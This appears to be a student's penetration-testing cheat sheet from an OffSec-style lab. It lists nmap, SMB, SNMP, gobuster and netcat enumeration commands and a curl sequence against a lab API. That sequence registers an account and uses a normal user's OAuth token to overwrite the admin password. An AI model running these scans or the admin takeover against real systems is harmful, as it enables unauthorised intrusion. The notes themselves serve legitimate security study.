# Cheetsheet
## Websites
- Shodan.io: Gives info on websites
- https://www.ssllabs.com/ssltest/ = ssl vul teste and info on sites


  
Enumeration tips:
Can use inspect elements on a web page to find out what server its running on






















# Nmap 
### How to find scripts on nmap
```
ls /usr/share/nmap/scripts | grep <target word, eg:http>
```

### Starting scan 
```
nmap -sCV -T4 -O --osscan-guess -v -p- <target_ip>

```

### Script for checking for base cves

```
sudo nmap -sV -p<port> --script "vuln" <ip>
```


### run udp after tcp nmap to see if its open because its important if it is
```
sudo nmap -Pn -n $IP -sU --top-ports=100 --reason
```
### SMD enumeration typically for port 139 and 445 if they open
```
nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* <target_ip>
```

# WEBsite scanning

### Gobuster: map all its publicly-accessible files and directories
```
gobuster dir -u <target> -w /usr/share/wordlists/dirb/common.txt
```
If you can find anything under it then you can go even further like with this example to find more
```
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```
Use this command to dig deeper if you find users 
```
curl -i http://192.168.50.16:5002/users/v1
```
If found info and can try to login with 
```
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
If cant login could try to make my own account on the site
```
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
```
Can use the put method to insert account if other methods fail( Also the OAuth token is gathered from a login of a normal user)
```
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```


### Net cat
It is used to send and recive data over an open port, -lvnp is to setup a listener
```
nc <target_ip> <port>
```


### SNMP
```
-Nmap UDP scan-
sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt

snmp walk is important to see what software and user accounts are on the machine

snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly

snmpwalk -c public -v1 -t 10 <IP>     #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25    #Windows User enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2     #Windows Processes enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2       #Installed software enumeraion
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3           #Opened TCP Ports

-Windows MIB values-
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports



```


#SQL injections
Put more info down below




























